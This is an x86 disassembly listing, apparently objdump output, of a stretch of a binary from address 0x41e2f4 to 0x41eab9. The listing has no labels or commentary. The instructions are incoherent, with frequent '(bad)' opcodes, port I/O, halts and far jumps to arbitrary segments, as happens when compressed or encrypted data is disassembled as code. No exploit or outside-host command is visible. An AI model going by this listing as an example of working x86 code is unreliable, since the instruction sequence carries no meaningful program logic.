  41e2f4:	xchg   DWORD PTR [edx+0x37],ecx
  41e2f7:	nop
  41e2f8:	hlt    
  41e2f9:	aaa    
  41e2fa:	dec    esp
  41e2fb:	cld    
  41e2fc:	push   eax
  41e2fd:	sahf   
  41e2fe:	and    edi,DWORD PTR [eax+0x7f793006]
  41e304:	cmp    eax,0x74089141
  41e309:	jns    0x41e296
  41e30b:	imul   esp,edx,0x7a
  41e30e:	cmp    BYTE PTR [ebp-0x78],0xfb
  41e312:	pop    ds
  41e313:	cmp    DWORD PTR [ebx-0x6a41096b],ecx
  41e319:	cmc    
  41e31a:	rcl    DWORD PTR [ebx],cl
  41e31c:	js     0x41e2f6
  41e31e:	sbb    ch,BYTE PTR [ebp+ebp*4-0x70392bd1]
  41e325:	xchg   esi,eax
  41e326:	arpl   WORD PTR [esp-0x32],sp
  41e32a:	inc    ecx
  41e32b:	push   edx
  41e32c:	mov    ebx,0x1dc93226
  41e331:	jp     0x41e2f9
  41e333:	div    DWORD PTR [edi-0x6885d62e]
  41e339:	mov    al,ds:0xd235a8b8
  41e33e:	dec    eax
  41e33f:	xchg   esi,eax
  41e341:	and    bh,al
  41e343:	jnp    0x41e381
  41e345:	dec    DWORD PTR [esi]
  41e347:	dec    DWORD PTR [edx]
  41e349:	stos   DWORD PTR es:[edi],eax
  41e34a:	unpckhps xmm1,XMMWORD PTR [edx-0x3926eed5]
  41e351:	cmp    ch,dh
  41e353:	jle    0x41e3d0
  41e355:	mov    DWORD PTR [edi+0x3be7bfc2],eax
  41e35b:	out    0x95,eax
  41e35d:	out    dx,al
  41e35e:	adc    eax,0x62db015b
  41e363:	and    eax,0xa569dd6b
  41e368:	out    dx,al
  41e369:	dec    edx
  41e36a:	xchg   edx,ebp
  41e36c:	(bad)  
  41e36d:	shl    DWORD PTR [edi-0x5b],cl
  41e370:	xchg   DWORD PTR ds:0x7bc6c7c9,ebp
  41e376:	and    bh,BYTE PTR [edx-0x4f]
  41e379:	les    edx,FWORD PTR [edx]
  41e37b:	je     0x41e347
  41e37d:	cmp    BYTE PTR [ecx+0x37],dl
  41e380:	dec    esp
  41e381:	mov    ebp,0xdde74691
  41e386:	mov    al,ds:0xd91a8710
  41e38b:	out    0x62,al
  41e38d:	dec    eax
  41e38e:	stos   BYTE PTR es:[edi],al
  41e38f:	or     ebx,0x2eb7d8ff
  41e395:	retf   
  41e396:	adc    al,0x97
  41e398:	inc    cl
  41e39a:	scas   al,BYTE PTR es:[edi]
  41e39b:	pusha  
  41e39c:	push   ebp
  41e39d:	and    eax,0x513e890
  41e3a2:	or     al,0xe5
  41e3a4:	pop    esi
  41e3a5:	mov    ebx,0x8f821d75
  41e3aa:	mov    ebp,0xa4b218a
  41e3af:	and    DWORD PTR [ebx+0x62],edi
  41e3b2:	cwde   
  41e3b3:	(bad)
  41e3b8:	ret    0xdee3
  41e3bb:	ins    BYTE PTR es:[edi],dx
  41e3bc:	cmp    edx,DWORD PTR [edi]
  41e3be:	(bad)  
  41e3bf:	push   ebp
  41e3c0:	test   DWORD PTR [edi+edx*4-0x68],ebp
  41e3c4:	or     ecx,esp
  41e3c6:	mov    bh,0x4e
  41e3c8:	out    0xcf,eax
  41e3ca:	aas    
  41e3cb:	test   BYTE PTR [ecx],0x61
  41e3ce:	inc    ebp
  41e3cf:	xchg   edi,eax
  41e3d0:	test   eax,0xc63a76e3
  41e3d5:	mov    al,dl
  41e3d7:	sbb    eax,0x4e561223
  41e3dc:	jns    0x41e405
  41e3de:	les    esp,FWORD PTR [ecx+0x747794aa]
  41e3e4:	inc    edi
  41e3e5:	jmp    0x41e443
  41e3e7:	rcl    BYTE PTR [esi-0x2e904bfd],0x0
  41e3ee:	add    BYTE PTR [eax],al
  41e3f0:	add    BYTE PTR [eax],al
  41e3f2:	add    al,0xf8
  41e3f5:	and    eax,edi
  41e3f7:	cmp    ecx,ebx
  41e3f9:	loope  0x41e3df
  41e3fb:	mov    esi,0xa570fc94
  41e400:	frstor [ebp+ecx*1+0x5f]
  41e404:	add    DWORD PTR [eax],eax
  41e406:	repz add al,0x0
  41e409:	add    BYTE PTR [esi-0x18],ah
  41e40c:	mov    al,ds:0xff3066de
  41e411:	outs   dx,DWORD PTR ds:[esi]
  41e412:	xchg   DWORD PTR [edi+esi*2+0x60],ebx
  41e416:	test   BYTE PTR [ecx],cl
  41e418:	popa   
  41e419:	xor    edi,0x25
  41e41c:	js     0x41e43f
  41e41e:	xor    eax,DWORD PTR [edi]
  41e420:	stos   DWORD PTR es:[edi],eax
  41e421:	sub    ah,dl
  41e423:	(bad)  
  41e424:	and    eax,0x8c1f87b4
  41e429:	icebp  
  41e42a:	sub    ebx,DWORD PTR [ebp+0x34]
  41e42d:	cmp    BYTE PTR [edi+eax*1-0x60553c00],dl
  41e434:	mov    ah,0xdb
  41e436:	mov    edi,esi
  41e438:	mov    esi,0x93a652a9
  41e43d:	mov    edi,0x128e8089
  41e442:	xchg   ebp,eax
  41e443:	jge    0x41e42c
  41e445:	test   bl,ch
  41e447:	sub    bh,bh
  41e449:	adc    BYTE PTR [ecx-0x25],cl
  41e44c:	inc    eax
  41e44d:	fist   DWORD PTR [ecx+0x23]
  41e450:	sub    ecx,DWORD PTR [edi-0x2f5aecf3]
  41e456:	pop    ecx
  41e457:	or     al,0xc3
  41e459:	xchg   BYTE PTR [ebp+0x2df1e0da],bh
  41e45f:	inc    edi
  41e460:	mov    ecx,DWORD PTR [edx*8-0x2818a820]
  41e467:	lods   al,BYTE PTR ds:[esi]
  41e468:	push   0xffffffa1
  41e46a:	sbb    al,0xeb
  41e46c:	xor    cl,bh
  41e46e:	mov    eax,DWORD PTR [ebx]
  41e470:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e471:	sub    al,0x2e
  41e473:	fsubr  DWORD PTR [esi-0x4f]
  41e476:	add    DWORD PTR [ecx-0x5440b2e],0xf
  41e47d:	call   0xcfec66dc
  41e482:	xor    al,0xa
  41e484:	xor    eax,0xdfa6a718
  41e489:	jae    0x41e4c2
  41e48b:	les    esp,FWORD PTR [edx+0x3bd83ad6]
  41e491:	lock rol DWORD PTR [edx-0x6be15940],1
  41e498:	jo     0x41e43e
  41e49a:	jb     0x41e459
  41e49c:	scas   eax,DWORD PTR es:[edi]
  41e49d:	or     eax,0x9e86dcb7
  41e4a2:	push   ebx
  41e4a3:	stc    
  41e4a4:	leave  
  41e4a5:	mov    BYTE PTR [ecx-0x22],cl
  41e4a8:	jae    0x41e496
  41e4aa:	es inc eax
  41e4ac:	ror    BYTE PTR [edx+0x6a],cl
  41e4af:	iret   
  41e4b0:	call   0x4fd83ffe
  41e4b5:	adc    DWORD PTR [edx+edi*4+0x789fe058],ebx
  41e4bc:	loopne 0x41e479
  41e4be:	sar    ah,0xb2
  41e4c1:	ss aaa 
  41e4c3:	inc    esp
  41e4c4:	push   ecx
  41e4c5:	jne    0x41e475
  41e4c7:	test   eax,0x7908cc72
  41e4cc:	pop    ecx
  41e4cd:	add    eax,0x42edd95e
  41e4d2:	je     0x41e52e
  41e4d4:	adc    eax,0xe754e25e
  41e4d9:	xor    DWORD PTR [ebx+0x2a250152],esi
  41e4df:	inc    eax
  41e4e0:	push   ds
  41e4e1:	sahf   
  41e4e2:	xor    ah,BYTE PTR [edx]
  41e4e4:	mov    ebp,0xf9d2fa3b
  41e4e9:	add    eax,0xcf79ace5
  41e4ee:	loop   0x41e523
  41e4f0:	mov    ds:0x73f525ab,al
  41e4f5:	cmp    eax,0x70cd1298
  41e4fa:	sub    cl,BYTE PTR [eax+0x66ba3d07]
  41e500:	fst    QWORD PTR [edx+0x6]
  41e503:	loop   0x41e50c
  41e505:	xchg   edi,eax
  41e506:	xchg   edi,eax
  41e507:	inc    esp
  41e508:	popf   
  41e509:	mov    ch,0xf4
  41e50b:	mov    al,ds:0xc16f34e1
  41e510:	(bad)
  41e513:	jnp    0x41e4bc
  41e515:	cwde   
  41e516:	loope  0x41e4b5
  41e518:	popf   
  41e519:	xor    bl,BYTE PTR [edi-0x1d98bb8d]
  41e51f:	scas   al,BYTE PTR es:[edi]
  41e520:	mov    DWORD PTR [edx],edx
  41e522:	push   esp
  41e523:	add    eax,DWORD PTR [ecx+0x6f]
  41e526:	inc    edi
  41e527:	lods   eax,DWORD PTR ds:[esi]
  41e528:	sbb    dh,BYTE PTR [ebp+0x4b91b4dd]
  41e52e:	iretw  
  41e530:	jb     0x41e54d
  41e532:	jle    0x41e5a1
  41e534:	inc    esi
  41e535:	sbb    DWORD PTR [eax-0x2c],eax
  41e538:	outs   dx,BYTE PTR ds:[si]
  41e53a:	in     al,0xd1
  41e53c:	push   edx
  41e53d:	sub    eax,0x39fb2133
  41e542:	clc    
  41e543:	sbb    cl,ah
  41e545:	adc    bh,BYTE PTR [ebp-0x15]
  41e548:	arpl   di,si
  41e54a:	xchg   ecx,ebp
  41e54c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e54d:	pushf  
  41e54e:	pop    esi
  41e54f:	mov    eax,0xaac9e82c
  41e554:	mov    bh,0xad
  41e556:	fidivr WORD PTR [ecx]
  41e558:	and    edx,eax
  41e55a:	mov    ebp,esi
  41e55c:	cmp    al,0x21
  41e55e:	mov    ecx,DWORD PTR [edi-0x48bfe042]
  41e564:	int    0xe1
  41e566:	daa    
  41e567:	repnz pusha 
  41e569:	lea    ebx,[ecx]
  41e56b:	ficom  WORD PTR [edi]
  41e56d:	inc    eax
  41e56e:	ins    BYTE PTR es:[edi],dx
  41e56f:	in     al,0x3c
  41e571:	fs jl  0x41e5ca
  41e574:	aad    0x28
  41e576:	mov    WORD PTR [eax+0x31a65e30],es
  41e57c:	mov    dl,0x3e
  41e57e:	loop   0x41e5fb
  41e580:	retf   0x6746
  41e583:	jns    0x41e5d6
  41e585:	mov    al,0x22
  41e587:	sub    al,0x46
  41e589:	sub    bl,bh
  41e58b:	cld    
  41e58c:	in     eax,dx
  41e58d:	adc    BYTE PTR [edi-0x545dab76],ah
  41e593:	and    ebx,0x13129bd0
  41e599:	inc    esi
  41e59a:	add    edi,edi
  41e59c:	jmp    0x31c2:0x439432e8
  41e5a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e5a4:	pop    ebx
  41e5a5:	mov    al,ds:0xf3b07764
  41e5aa:	lds    esp,FWORD PTR ss:[edi+ecx*8]
  41e5ae:	daa    
  41e5af:	shr    BYTE PTR [eax],1
  41e5b1:	mov    edx,0xc96aa754
  41e5b6:	fidivr DWORD PTR [ebx-0xb2c6f7]
  41e5bc:	das    
  41e5bd:	cli    
  41e5be:	or     ecx,DWORD PTR [ebx-0x22]
  41e5c1:	ja     0x41e56c
  41e5c3:	jae    0x41e5bf
  41e5c5:	mov    WORD PTR [eax+0x19],fs
  41e5c8:	jp     0x41e5e2
  41e5ca:	xchg   edx,eax
  41e5cb:	(bad)  
  41e5cc:	jbe    0x41e61d
  41e5ce:	mov    ecx,0x301fa455
  41e5d3:	je     0x41e602
  41e5d5:	pop    es
  41e5d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e5d7:	mov    ah,0x1f
  41e5d9:	push   ebx
  41e5da:	cwde   
  41e5db:	cmp    al,0x2b
  41e5dd:	mov    esp,0xae522ae3
  41e5e2:	xlat   BYTE PTR ds:[ebx]
  41e5e3:	into   
  41e5e4:	(bad)  
  41e5e5:	shr    BYTE PTR [ecx+0x37],0xa0
  41e5e9:	push   edi
  41e5ea:	xor    BYTE PTR [ebx+edx*1+0x24],0x88
  41e5ef:	in     al,0x41
  41e5f1:	lahf   
  41e5f2:	push   0xfffffff8
  41e5f4:	repz and al,0xb3
  41e5f7:	clc    
  41e5f8:	and    DWORD PTR [edx-0x3],ecx
  41e5fb:	ret    0x44d4
  41e5fe:	cmp    DWORD PTR [ebp+edi*8-0x32],esp
  41e602:	cmp    DWORD PTR ds:0xa8f2557c,esp
  41e608:	mov    ch,0xe5
  41e60a:	imul   BYTE PTR [esi+0x3c]
  41e60d:	pushf  
  41e60e:	ss in  al,0x20
  41e611:	push   esi
  41e612:	popf   
  41e613:	stos   DWORD PTR es:[edi],eax
  41e614:	aas    
  41e615:	cmp    al,0x50
  41e617:	mov    bl,0xe4
  41e619:	gs dec eax
  41e61b:	sub    ebp,DWORD PTR [edx-0x74]
  41e61e:	rcr    BYTE PTR [eax+0x72],0xb2
  41e622:	xchg   ecx,eax
  41e623:	ss pop edx
  41e625:	les    ebp,FWORD PTR [eax]
  41e627:	adc    ecx,DWORD PTR [eax]
  41e629:	xchg   edi,eax
  41e62a:	pop    ecx
  41e62b:	imul   edi,DWORD PTR [ecx+0x35],0xc564ef93
  41e632:	push   ss
  41e633:	leave  
  41e634:	dec    ebp
  41e635:	cmc    
  41e636:	fmul   DWORD PTR [esi-0x5e]
  41e639:	mov    esi,0x70776c79
  41e63e:	hlt    
  41e63f:	push   esi
  41e640:	int    0xd4
  41e642:	add    eax,0x1aa08501
  41e647:	lods   al,BYTE PTR ds:[esi]
  41e648:	(bad)  
  41e649:	cmp    dl,dl
  41e64b:	mov    DWORD PTR [eax-0x2d832971],ecx
  41e651:	jo     0x41e6c6
  41e653:	call   0xd4fd0dbe
  41e658:	mov    esi,0x9a2d6734
  41e65d:	mov    bl,0x6c
  41e65f:	and    esi,ebp
  41e661:	mov    bh,0x6a
  41e663:	std    
  41e664:	les    ecx,FWORD PTR [eax+0x350caf8d]
  41e66a:	sbb    ah,bl
  41e66c:	push   eax
  41e66d:	mov    eax,0x9ae108db
  41e672:	shl    DWORD PTR [eax-0x72b05fb0],1
  41e678:	test   eax,0x24710bdd
  41e67d:	ret    
  41e67e:	mov    ds:0xb3c92cb8,al
  41e683:	cmp    eax,0x16aabfd9
  41e688:	sbb    bl,bh
  41e68a:	ror    BYTE PTR [ebx],0xda
  41e68d:	inc    ecx
  41e68e:	repnz mov ecx,0xd5648fcb
  41e694:	sub    al,0xbf
  41e696:	inc    ebp
  41e697:	dec    ebp
  41e698:	div    ah
  41e69a:	repnz clc 
  41e69c:	int    0x5f
  41e69e:	jp     0x41e6f2
  41e6a0:	in     al,0xe6
  41e6a2:	add    ebp,ebx
  41e6a4:	sub    ch,dl
  41e6a6:	rcl    BYTE PTR [ebx],1
  41e6a8:	mov    BYTE PTR [ebx-0x453bce78],dh
  41e6ae:	add    al,0xc8
  41e6b0:	nop
  41e6b1:	dec    ecx
  41e6b2:	inc    ebx
  41e6b3:	and    edi,ebx
  41e6b5:	mov    bh,0xa8
  41e6b7:	sbb    BYTE PTR [esi+0x7b],0xcb
  41e6bb:	jmp    0x41e672
  41e6bd:	or     eax,0x9b3989dc
  41e6c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e6c3:	jne    0x41e6c0
  41e6c5:	sub    al,0xcc
  41e6c7:	fistp  DWORD PTR [esi]
  41e6c9:	cli    
  41e6ca:	mov    eax,0xcc67829a
  41e6cf:	repz fild WORD PTR ds:0x96770772
  41e6d6:	fiadd  WORD PTR [esi-0x45]
  41e6d9:	fdivr  QWORD PTR [edx+0x51ac850d]
  41e6df:	ror    BYTE PTR [esi+0x3005171b],0x4a
  41e6e6:	je     0x41e6c4
  41e6e8:	stos   DWORD PTR es:[edi],eax
  41e6e9:	or     BYTE PTR [ebp+0x16],ah
  41e6ec:	(bad)  [ebp+0x24e9942c]
  41e6f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e6f3:	push   cs
  41e6f4:	ins    DWORD PTR es:[edi],dx
  41e6f5:	int3   
  41e6f6:	sbb    cl,ah
  41e6f8:	out    0xc8,al
  41e6fa:	inc    eax
  41e6fb:	adc    BYTE PTR [ebp+0x6e5635f0],ah
  41e701:	sub    edx,ebp
  41e703:	xchg   ebx,eax
  41e704:	js     0x41e763
  41e706:	lods   al,BYTE PTR ds:[esi]
  41e707:	mov    DWORD PTR [edi],ebx
  41e709:	fdivp  st(5),st
  41e70b:	jmp    0x1ed2:0x5699e08b
  41e712:	aam    0xa8
  41e714:	inc    esi
  41e715:	fcom   st(7)
  41e717:	push   ss
  41e718:	sbb    DWORD PTR [eax+0x5d],esp
  41e71b:	imul   esp,DWORD PTR [ebp+ebx*4-0x3f],0x74
  41e720:	aad    0x2e
  41e722:	fidivr DWORD PTR [esi]
  41e724:	test   eax,0x7ce90207
  41e729:	mov    BYTE PTR ds:0x1f04abb2,ch
  41e72f:	fs (bad) 
  41e731:	fwait
  41e732:	jbe    0x41e6bb
  41e734:	dec    ebx
  41e735:	mov    DWORD PTR [ebx-0x10b9b0e0],esp
  41e73b:	push   ebx
  41e73c:	dec    esp
  41e73d:	mov    eax,edi
  41e73f:	hlt    
  41e740:	cmp    DWORD PTR [edi+0x69e94449],edi
  41e746:	xchg   ebx,eax
  41e747:	sbb    edx,DWORD PTR [ecx]
  41e749:	jmp    0x41e786
  41e74b:	leave  
  41e74c:	add    cl,BYTE PTR [esp+ebx*2-0x663e95d7]
  41e753:	push   esi
  41e754:	cmc    
  41e755:	mov    al,0x69
  41e757:	fs ins BYTE PTR es:[edi],dx
  41e759:	mov    al,ds:0x31f31a7e
  41e75e:	mov    edi,0x58422cc5
  41e763:	mov    edx,0x113a088c
  41e768:	xchg   ecx,eax
  41e769:	pop    ss
  41e76a:	sub    DWORD PTR [ecx+0x6e8d8af2],esi
  41e770:	nop
  41e771:	inc    DWORD PTR [edi]
  41e773:	sbb    eax,0x29b1f6f0
  41e778:	outs   dx,DWORD PTR ds:[esi]
  41e779:	dec    ecx
  41e77a:	sub    al,BYTE PTR [edi-0x53]
  41e77d:	pop    edi
  41e77e:	pop    eax
  41e77f:	sbb    DWORD PTR [edx+0x25f42fc2],edi
  41e785:	push   ds
  41e786:	jecxz  0x41e734
  41e788:	sub    al,0xec
  41e78a:	out    0xae,al
  41e78c:	adc    DWORD PTR [edi+0x19],edx
  41e78f:	ins    BYTE PTR es:[edi],dx
  41e790:	xchg   ebp,eax
  41e791:	and    DWORD PTR [edi-0x509c8605],eax
  41e797:	mov    dh,0xbf
  41e799:	mov    ebp,0x7415e360
  41e79e:	jge    0x41e7f6
  41e7a0:	ret    
  41e7a1:	mov    al,0x3d
  41e7a3:	shr    DWORD PTR [eax+0x68],1
  41e7a6:	push   cs
  41e7a7:	sub    cl,BYTE PTR gs:[ebp-0x559a935d]
  41e7ae:	xor    al,0xc
  41e7b0:	ret    0xfd08
  41e7b3:	mov    ebx,0x9e796eb7
  41e7b8:	push   cs
  41e7b9:	(bad)  
  41e7bb:	sbb    ah,BYTE PTR [ecx+0x56d3a55b]
  41e7c1:	bnd jb 0x41e817
  41e7c4:	lds    eax,FWORD PTR [eax-0x3f6fb677]
  41e7ca:	fdivrp st(1),st
  41e7cc:	dec    DWORD PTR [bp-0x65b7]
  41e7d1:	push   cs
  41e7d2:	std    
  41e7d3:	dec    ecx
  41e7d4:	xor    bl,cl
  41e7d6:	(bad)  
  41e7d7:	jecxz  0x41e75c
  41e7d9:	jno    0x41e845
  41e7db:	add    al,0x93
  41e7dd:	ja     0x41e806
  41e7df:	es ds pop edx
  41e7e2:	jmp    0xb6373fc0
  41e7e7:	lods   eax,DWORD PTR es:[esi]
  41e7e9:	ror    BYTE PTR [ebx+0x7c43f480],1
  41e7ef:	xor    eax,0x4addf98a
  41e7f4:	(bad)  
  41e7f5:	or     esi,DWORD PTR [edi]
  41e7f7:	fcomp  st(0)
  41e7f9:	xlat   BYTE PTR ds:[ebx]
  41e7fa:	ret    
  41e7fb:	fwait
  41e7fc:	mov    ds:0x1077b90f,eax
  41e801:	mov    esi,0x8781ffab
  41e806:	(bad)  
  41e808:	popf   
  41e809:	xchg   ebx,eax
  41e80a:	std    
  41e80b:	stos   DWORD PTR es:[edi],eax
  41e80c:	cmp    BYTE PTR [esi],dh
  41e80e:	sub    ah,BYTE PTR [eax+0x77c600e4]
  41e814:	mov    ds:0xbfa67c37,al
  41e819:	sbb    BYTE PTR [ebx-0x1096ebd0],ch
  41e81f:	test   eax,0xe06b8fef
  41e824:	pop    esp
  41e825:	fisubr DWORD PTR [esi+0x33f2c5a]
  41e82b:	sub    BYTE PTR [esi+0x2c],0x28
  41e82f:	jl     0x41e7e6
  41e831:	scas   eax,DWORD PTR es:[edi]
  41e832:	loopne 0x41e853
  41e834:	imul   esi,edx,0xffffffef
  41e837:	aas    
  41e838:	sub    DWORD PTR [esi],edx
  41e83a:	mov    al,BYTE PTR [edx-0x11]
  41e83d:	pushf  
  41e83e:	test   DWORD PTR [eax-0x515de6b3],edx
  41e844:	jge    0x41e7cb
  41e846:	sbb    DWORD PTR ds:0x4dcc175e,edi
  41e84c:	mov    eax,ds:0xda899f81
  41e851:	mov    al,ds:0xb1bff4a4
  41e856:	gs (bad) 
  41e858:	push   0xc7d1c888
  41e85d:	jmp    0xf53ba5e8
  41e862:	push   ebx
  41e863:	lods   eax,DWORD PTR ds:[esi]
  41e864:	pop    esp
  41e865:	fdivp  st(0),st
  41e867:	call   0x7b59:0xc772151f
  41e86e:	mov    ebp,0x1a3e5114
  41e873:	pop    esi
  41e874:	inc    esi
  41e875:	mov    ds:0xbff62d4e,eax
  41e87a:	jge    0x41e87d
  41e87c:	inc    ecx
  41e87d:	pop    ecx
  41e87e:	adc    BYTE PTR [eax+0x6b],bh
  41e881:	xor    eax,0x4fcfcc00
  41e886:	iret   
  41e887:	daa    
  41e888:	adc    esp,edx
  41e88a:	cli    
  41e88b:	shl    DWORD PTR [ebp-0x13],cl
  41e88e:	sbb    al,0x26
  41e890:	out    0xdc,eax
  41e892:	jno    0x41e8d5
  41e894:	jl     0x41e8be
  41e896:	xchg   esi,eax
  41e897:	xchg   DWORD PTR [esi+eiz*1],ebp
  41e89a:	fwait
  41e89b:	pop    es
  41e89c:	mov    ah,0x8b
  41e89e:	xor    esp,DWORD PTR [edx+0x40]
  41e8a1:	inc    edx
  41e8a2:	pop    edi
  41e8a3:	test   BYTE PTR [eax+0x61c17316],cl
  41e8a9:	mov    ah,dh
  41e8ab:	mov    eax,0xaa9070df
  41e8b0:	addr16 fdivr st(0),st
  41e8b3:	mov    ds:0x438160f3,eax
  41e8b8:	(bad)  
  41e8b9:	fild   WORD PTR [esi+0x5a]
  41e8bc:	adc    ebx,ecx
  41e8be:	mov    eax,ds:0xe40c46b2
  41e8c3:	outs   dx,BYTE PTR ds:[esi]
  41e8c4:	sbb    al,0x2f
  41e8c6:	fwait
  41e8c7:	fs out dx,al
  41e8c9:	jl     0x41e900
  41e8cb:	push   0x916cf7ca
  41e8d0:	jno    0x41e930
  41e8d2:	add    ebx,DWORD PTR [ebx]
  41e8d4:	xchg   esi,esp
  41e8d6:	or     al,0x39
  41e8d8:	pop    esi
  41e8d9:	rcl    BYTE PTR [ebx-0x7b],1
  41e8dc:	into   
  41e8dd:	and    eax,0x7a505cc
  41e8e2:	add    al,0x87
  41e8e4:	repnz fsub QWORD PTR [edi+esi*8-0x65592bbe]
  41e8ec:	mov    BYTE PTR [ecx+0x4a35f426],ah
  41e8f2:	lock sbb bh,BYTE PTR ds:0xd893ec50
  41e8f9:	aas    
  41e8fa:	mov    eax,0xba62
  41e8ff:	add    BYTE PTR [eax],al
  41e901:	add    BYTE PTR [edi+0x78],bh
  41e904:	mov    ecx,0xffd5bf55
  41e909:	jp     0x41e931
  41e90b:	ret    0x676d
  41e90e:	loopne 0x41e988
  41e910:	loop   0x41e8c8
  41e912:	add    BYTE PTR [ecx+eax*1+0x0],ah
  41e916:	repz add al,0x0
  41e919:	add    BYTE PTR [ecx],al
  41e91b:	dec    esp
  41e91c:	out    dx,eax
  41e91d:	push   ds
  41e91e:	dec    ecx
  41e91f:	adc    ebp,ebx
  41e921:	and    bp,cx
  41e924:	pop    edx
  41e925:	push   0xa891a762
  41e92a:	inc    ebx
  41e92b:	jle    0x41e970
  41e92d:	mov    eax,ds:0x7161927
  41e932:	cmp    bh,al
  41e934:	push   edi
  41e935:	js     0x41e901
  41e937:	push   ebx
  41e938:	xor    al,0xe2
  41e93a:	or     eax,0xd87ff908
  41e93f:	lods   eax,DWORD PTR ds:[esi]
  41e940:	sub    ch,ah
  41e942:	(bad)  
  41e943:	retf   0xf5b7
  41e946:	int    0x3a
  41e948:	jp     0x41e977
  41e94a:	in     eax,0x5c
  41e94c:	xchg   ebx,eax
  41e94d:	mov    cl,0xb5
  41e94f:	mov    eax,ds:0xb0647936
  41e954:	add    edx,DWORD PTR [edx+0x10713b9b]
  41e95a:	je     0x41e985
  41e95c:	ret    0x4b1e
  41e95f:	out    dx,al
  41e960:	and    al,0xd
  41e963:	(bad)  
  41e964:	arpl   WORD PTR [edi-0x704fdb72],dx
  41e96a:	rol    DWORD PTR [eax-0x448de858],1
  41e970:	test   BYTE PTR [ebx-0x462cb38e],al
  41e976:	fdiv   DWORD PTR [edi-0x3f]
  41e979:	lea    ebp,[ebp+0x6ddfe0e2]
  41e97f:	lods   al,BYTE PTR ds:[esi]
  41e980:	(bad)  
  41e981:	fbstp  TBYTE PTR [ecx]
  41e983:	push   edx
  41e984:	push   ebx
  41e985:	add    edx,edx
  41e987:	jp     0x41e969
  41e989:	jbe    0x41e971
  41e98b:	sbb    al,0xc0
  41e98d:	push   ecx
  41e98e:	gs push cs
  41e990:	mov    dh,bl
  41e992:	not    DWORD PTR [esi]
  41e994:	push   0x3737e4da
  41e999:	jb     0x41ea03
  41e99b:	lea    esp,[ecx]
  41e99d:	jge    0x41ea1d
  41e99f:	icebp  
  41e9a0:	xchg   esp,eax
  41e9a1:	js     0x41e950
  41e9a3:	retf   0xc33
  41e9a6:	xchg   ebx,eax
  41e9a7:	in     eax,0xf1
  41e9a9:	push   0x39cc7ea1
  41e9ae:	add    BYTE PTR [edx+eax*2-0x16],cl
  41e9b2:	or     dh,ah
  41e9b4:	call   0x8ae8:0x9c326770
  41e9bb:	in     al,0x48
  41e9bd:	xlat   BYTE PTR ds:[ebx]
  41e9be:	mov    gs,esi
  41e9c0:	jmp    0x2b455a2d
  41e9c5:	loopne 0x41ea07
  41e9c7:	xor    ah,BYTE PTR [ebx-0x5c]
  41e9ca:	inc    ecx
  41e9cb:	mov    ds:0x802c2033,eax
  41e9d0:	fdivrp st(0),st
  41e9d2:	retf   0xb5
  41e9d5:	cli    
  41e9d6:	cwde   
  41e9d7:	lds    esi,FWORD PTR [ebp-0x3]
  41e9da:	mov    edx,0x4f631dea
  41e9df:	in     al,0x67
  41e9e1:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e9e3:	cwde   
  41e9e4:	sub    edx,DWORD PTR [edi]
  41e9e6:	add    eax,0x32557ef9
  41e9eb:	jecxz  0x41e9f4
  41e9ed:	pusha  
  41e9ee:	ins    BYTE PTR es:[edi],dx
  41e9ef:	enter  0x4b6d,0xce
  41e9f3:	ja     0x41e9e4
  41e9f5:	mov    ah,0x7b
  41e9f7:	in     eax,0x9a
  41e9f9:	sbb    DWORD PTR [ecx-0x19],eax
  41e9fc:	mov    eax,0xff41e27
  41ea01:	popa   
  41ea02:	and    esp,DWORD PTR [eax+0x13]
  41ea05:	push   cs
  41ea06:	mov    al,ds:0xb1666f74
  41ea0b:	mov    bl,0x87
  41ea0d:	xor    ah,BYTE PTR [edi]
  41ea0f:	and    DWORD PTR [eax],edx
  41ea11:	dec    edi
  41ea12:	clc    
  41ea13:	add    eax,0x6cce45b9
  41ea18:	mov    ecx,0x8061c60e
  41ea1d:	add    BYTE PTR [edx],0x4b
  41ea20:	adc    eax,0x28995434
  41ea25:	clc    
  41ea26:	or     ebp,ebx
  41ea28:	or     dl,BYTE PTR [ebx]
  41ea2a:	xor    DWORD PTR [edi],0x920a4179
  41ea30:	and    cl,BYTE PTR [edi]
  41ea32:	adc    ebp,DWORD PTR [esi-0x48b7f607]
  41ea38:	cld    
  41ea39:	jge    0x41ea5d
  41ea3b:	sahf   
  41ea3c:	or     bh,dh
  41ea3e:	jmp    0xe631:0xf84e6a80
  41ea45:	jno    0x41ea3e
  41ea47:	xchg   ebx,eax
  41ea48:	call   0x47ef1fe7
  41ea4d:	pusha  
  41ea4e:	pop    ecx
  41ea4f:	adc    BYTE PTR [eax-0x4b],ah
  41ea52:	mov    esp,0x37697cc8
  41ea57:	push   ss
  41ea58:	push   0xffffffb6
  41ea5a:	adc    eax,0x42e2c600
  41ea5f:	pop    es
  41ea60:	rcl    DWORD PTR [esi+0x27ab181c],1
  41ea66:	xchg   ecx,eax
  41ea67:	mov    edx,eax
  41ea69:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ea6a:	dec    edx
  41ea6b:	jg     0x41ea72
  41ea6d:	or     bl,bh
  41ea6f:	popa   
  41ea70:	add    edi,DWORD PTR [edx-0x16546237]
  41ea76:	(bad)  
  41ea77:	jne    0x41eac1
  41ea79:	push   edi
  41ea7a:	jmp    0xeb92bd1f
  41ea7f:	and    dh,BYTE PTR [eax+0x7cc0c11f]
  41ea85:	sub    bh,BYTE PTR [eax]
  41ea87:	fld    QWORD PTR [ebx+0x1b5af074]
  41ea8d:	(bad)  
  41ea8e:	std    
  41ea8f:	cdq    
  41ea90:	out    0x8,eax
  41ea92:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ea93:	lock sbb eax,0xda8d4b40
  41ea99:	sub    al,0xff
  41ea9b:	mov    WORD PTR [edi+0x7f72205b],gs
  41eaa1:	and    eax,0xa74824e8
  41eaa6:	mov    eax,ds:0xa059f8f7
  41eaab:	xchg   ebx,eax
  41eaac:	dec    edi
  41eaad:	add    DWORD PTR [esi+0x72],0xffffffd7
  41eab1:	sti    
  41eab2:	push   cs
  41eab3:	aaa    
  41eab4:	enter  0xcc4,0x50
  41eab8:	stos   BYTE PTR es:[edi],al
  41eab9:	aam    0x32
